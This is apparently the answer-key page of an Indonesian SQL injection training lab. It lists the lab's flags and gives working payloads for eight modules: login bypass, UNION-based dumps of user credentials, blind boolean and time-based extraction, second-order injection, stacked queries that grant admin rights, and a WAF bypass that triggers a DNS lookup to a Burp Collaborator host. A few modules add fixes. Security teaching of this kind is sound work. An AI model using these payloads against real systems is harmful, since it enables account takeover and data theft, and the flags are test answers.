<?php
/**
 * =============================================================
 * LAB SQL INJECTION — KUNCI JAWABAN & PANDUAN WALKTHROUGH
 * Panduan lengkap penyelesaian 8 modul lab beserta seluruh Flag
 * =============================================================
 */
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kunci Jawaban & Panduan Solusi — Lab SQL Injection</title>
    <link rel="stylesheet" href="../assets/css/style.css">
</head>
<body>
<canvas id="matrix-canvas"></canvas>

<div class="wrapper">
    <a href="../index.php" class="nav-back">← KEMBALI KE DASHBOARD</a>

    <header class="hero" style="padding:24px 0 32px;">
        <h1 class="hero-title" style="font-size:2.2rem;">📖 KUNCI JAWABAN & WALKTHROUGH</h1>
        <p class="hero-sub">// Analisis Mendalam · Contoh Payload Tembus · Mitigasi Penambalan Kode //</p>
    </header>

    <!-- Panel Kunci Flag -->
    <div class="panel" style="border-color: rgba(245, 158, 11, 0.4); margin-bottom:30px;">
        <div class="panel-header">
            <div class="terminal-dots"><span class="dot-red"></span><span class="dot-yellow"></span><span class="dot-green"></span></div>
            <div class="panel-title" style="color:#fbbf24;">🚩 DAFTAR FLAG RAHASIA LABORATORIUM</div>
        </div>
        <div style="display:grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap:15px;">
            <div style="background:#030712; padding:14px; border-radius:8px; border:1px solid rgba(245,158,11,0.2);">
                <div style="color:#06b6d4; font-size:0.75rem; font-weight:600; text-transform:uppercase;">Flag Rahasia Admin (Modul 01):</div>
                <div style="color:#34d399; font-family:'JetBrains Mono',monospace; font-size:0.85rem; font-weight:700; margin-top:4px;">FLAG{admin_account_compromised_via_sqli}</div>
            </div>
            <div style="background:#030712; padding:14px; border-radius:8px; border:1px solid rgba(245,158,11,0.2);">
                <div style="color:#06b6d4; font-size:0.75rem; font-weight:600; text-transform:uppercase;">Eksfiltrasi UNION (Modul 02):</div>
                <div style="color:#34d399; font-family:'JetBrains Mono',monospace; font-size:0.85rem; font-weight:700; margin-top:4px;">FLAG{union_based_exfiltration_success}</div>
            </div>
            <div style="background:#030712; padding:14px; border-radius:8px; border:1px solid rgba(245,158,11,0.2);">
                <div style="color:#06b6d4; font-size:0.75rem; font-weight:600; text-transform:uppercase;">Kebocoran Error (Modul 03):</div>
                <div style="color:#34d399; font-family:'JetBrains Mono',monospace; font-size:0.85rem; font-weight:700; margin-top:4px;">FLAG{errors_are_information_disclosure}</div>
            </div>
            <div style="background:#030712; padding:14px; border-radius:8px; border:1px solid rgba(245,158,11,0.2);">
                <div style="color:#06b6d4; font-size:0.75rem; font-weight:600; text-transform:uppercase;">Blind Boolean (Modul 04):</div>
                <div style="color:#34d399; font-family:'JetBrains Mono',monospace; font-size:0.85rem; font-weight:700; margin-top:4px;">FLAG{blind_boolean_no_output_needed}</div>
            </div>
            <div style="background:#030712; padding:14px; border-radius:8px; border:1px solid rgba(245,158,11,0.2);">
                <div style="color:#06b6d4; font-size:0.75rem; font-weight:600; text-transform:uppercase;">Blind Time-Based (Modul 05):</div>
                <div style="color:#34d399; font-family:'JetBrains Mono',monospace; font-size:0.85rem; font-weight:700; margin-top:4px;">FLAG{time_delays_reveal_all_secrets}</div>
            </div>
            <div style="background:#030712; padding:14px; border-radius:8px; border:1px solid rgba(245,158,11,0.2);">
                <div style="color:#06b6d4; font-size:0.75rem; font-weight:600; text-transform:uppercase;">Detonasi Second-Order (Modul 06):</div>
                <div style="color:#34d399; font-family:'JetBrains Mono',monospace; font-size:0.85rem; font-weight:700; margin-top:4px;">FLAG{stored_payload_detonated_second_order}</div>
            </div>
        </div>
    </div>

    <!-- Tombol Buka / Tutup Semua -->
    <div style="display:flex; justify-content:flex-end; gap:10px; margin-bottom:20px;">
        <button class="btn btn-cyan btn-sm" onclick="document.querySelectorAll('.solution-body').forEach(b => b.classList.add('open'));">
            📂 Buka Semua Solusi
        </button>
        <button class="btn btn-cyan btn-sm" onclick="document.querySelectorAll('.solution-body').forEach(b => b.classList.remove('open'));">
            📁 Tutup Semua Solusi
        </button>
    </div>

    <!-- MODUL 01 -->
    <div class="solution-block">
        <div class="solution-header" onclick="toggleSolution('sol1')">
            <h3>MODUL 01: BYPASS LOGIN KLASIK</h3>
            <span class="arrow">▼</span>
        </div>
        <div class="solution-body" id="sol1">
            <p><strong>Tujuan:</strong> Melewati form login autentikasi tanpa kata sandi yang valid.</p>
            <p><strong>Potongan Kode Rentan:</strong></p>
            <div class="code-block">$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";</div>
            <p><strong>Contoh Payload:</strong></p>
            <div class="code-block" style="color:#34d399;">
# Pada kolom Username (kolom password bisa diisi bebas):
' OR '1'='1' --
admin' --
' OR 1=1 --
            </div>
            <p><strong>Solusi Perbaikan (Remediation):</strong> Gunakan PDO Prepared Statements:</p>
            <div class="code-block">
$stmt = $db->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);
            </div>
        </div>
    </div>

    <!-- MODUL 02 -->
    <div class="solution-block">
        <div class="solution-header" onclick="toggleSolution('sol2')">
            <h3>MODUL 02: INJEKSI SQL BERBASIS UNION</h3>
            <span class="arrow">▼</span>
        </div>
        <div class="solution-body" id="sol2">
            <p><strong>Tujuan:</strong> Mengambil isi tabel lain selain tabel produk.</p>
            <p><strong>Langkah 1: Menghitung Jumlah Kolom Query Asli</strong></p>
            <div class="code-block">Elektronik' ORDER BY 5-- (Berhasil)
Elektronik' ORDER BY 6-- (Gagal/Error -> Menandakan tepat 5 kolom!)</div>
            <p><strong>Langkah 2: Ekstraksi Data Tabel Users & Flags</strong></p>
            <div class="code-block" style="color:#34d399;">
x' UNION SELECT 1, username, password, role, secret FROM users--
x' UNION SELECT 1, name, value, description, 5 FROM flags--
x' UNION SELECT 1, name, sql, 4, 5 FROM sqlite_master--
            </div>
        </div>
    </div>

    <!-- MODUL 03 -->
    <div class="solution-block">
        <div class="solution-header" onclick="toggleSolution('sol3')">
            <h3>MODUL 03: INJEKSI SQL BERBASIS ERROR</h3>
            <span class="arrow">▼</span>
        </div>
        <div class="solution-body" id="sol3">
            <p><strong>Tujuan:</strong> Memanfaatkan parameter numerik dan mengeksploitasi error verbose.</p>
            <p><strong>Contoh Payload:</strong></p>
            <div class="code-block" style="color:#34d399;">
0 UNION SELECT 1, username, password, role, secret FROM users
0 UNION SELECT 1, name, value, description, 1 FROM flags
            </div>
            <p><strong>Solusi Perbaikan:</strong> Validasi integer dan matikan pesan error teknis ke publik:</p>
            <div class="code-block">
$id = filter_var($_POST['product_id'], FILTER_VALIDATE_INT);
// Selalu tangkap exception dan jangan tampilkan $e->getMessage() di production
            </div>
        </div>
    </div>

    <!-- MODUL 04 -->
    <div class="solution-block">
        <div class="solution-header" onclick="toggleSolution('sol4')">
            <h3>MODUL 04: BLIND SQL INJECTION BERBASIS BOOLEAN</h3>
            <span class="arrow">▼</span>
        </div>
        <div class="solution-body" id="sol4">
            <p><strong>Tujuan:</strong> Mengambil data dari perbedaan respon BENAR / SALAH.</p>
            <p><strong>Contoh Payload:</strong></p>
            <div class="code-block" style="color:#34d399;">
admin' AND '1'='1 --   (Mengembalikan PENGGUNA DITEMUKAN)
admin' AND '1'='2 --   (Mengembalikan PENGGUNA TIDAK DITEMUKAN)
admin' AND LENGTH(password)=18 --
admin' AND SUBSTR(password,1,1)='s' -- (Penebakan karakter pertama)
            </div>
        </div>
    </div>

    <!-- MODUL 05 -->
    <div class="solution-block">
        <div class="solution-header" onclick="toggleSolution('sol5')">
            <h3>MODUL 05: BLIND SQL INJECTION BERBASIS WAKTU</h3>
            <span class="arrow">▼</span>
        </div>
        <div class="solution-body" id="sol5">
            <p><strong>Tujuan:</strong> Mengambil data dengan memanfaatkan delay waktu respon server.</p>
            <p><strong>Contoh Payload:</strong></p>
            <div class="code-block" style="color:#34d399;">
admin' AND sleep(3)--
admin' AND (CASE WHEN (SUBSTR(password,1,1)='s') THEN sleep(3) ELSE 0 END)--
admin' AND (CASE WHEN ((SELECT SUBSTR(value,1,4) FROM flags WHERE name='time_flag')='FLAG') THEN sleep(2) ELSE 0 END)--
            </div>
        </div>
    </div>

    <!-- MODUL 06 -->
    <div class="solution-block">
        <div class="solution-header" onclick="toggleSolution('sol6')">
            <h3>MODUL 06: INJEKSI SQL SECOND-ORDER</h3>
            <span class="arrow">▼</span>
        </div>
        <div class="solution-body" id="sol6">
            <p><strong>Tujuan:</strong> Menanam payload aman di database, meledak di query lain.</p>
            <p><strong>Tahap 1 (Form Registrasi):</strong> Masukkan username: <code>admin'--</code> atau <code>' OR '1'='1</code></p>
            <p><strong>Tahap 2 (Detonasi):</strong> Klik tombol DETONASI pada profil yang tersimpan untuk menjalankan query sekunder yang mempercayai isi username tersebut.</p>
        </div>
    </div>

    <!-- MODUL 07 -->
    <div class="solution-block">
        <div class="solution-header" onclick="toggleSolution('sol7')">
            <h3>MODUL 07: STACKED QUERIES (MULTI-STATEMENT)</h3>
            <span class="arrow">▼</span>
        </div>
        <div class="solution-body" id="sol7">
            <p><strong>Tujuan:</strong> Menjalankan perintah selain SELECT menggunakan titik-koma.</p>
            <p><strong>Contoh Payload:</strong></p>
            <div class="code-block" style="color:#34d399;">
test'); UPDATE users SET role='admin' WHERE username='alice'; --
test'); INSERT INTO users (username, password, email, role, secret) VALUES ('hacked_root', 'pass', 'root@pwned.lab', 'admin', 'FLAG{stacked_win}'); --
            </div>
        </div>
    </div>

    <!-- MODUL 08 -->
    <div class="solution-block">
        <div class="solution-header" onclick="toggleSolution('sol8')">
            <h3>MODUL 08: BYPASS WAF & EKSFILTRASI OUT-OF-BAND</h3>
            <span class="arrow">▼</span>
        </div>
        <div class="solution-body" id="sol8">
            <p><strong>Tujuan:</strong> Mengelabui filter blacklist WAF dan memicu eksfiltrasi DNS.</p>
            <p><strong>Contoh Payload:</strong></p>
            <div class="code-block" style="color:#34d399;">
' UN/**/ION SEL/**/ECT 1, username, role, password FROM users /*
' OR 'a'='a /*
' OR dns_lookup('target-token.burpcollaborator.net') /*
            </div>
        </div>
    </div>
</div>

<footer class="site-footer">
    <div>KUNCI JAWABAN & WALKTHROUGH · LAB PRAKTIK SQL INJECTION</div>
</footer>
<script src="../assets/js/main.js"></script>
</body>
</html>
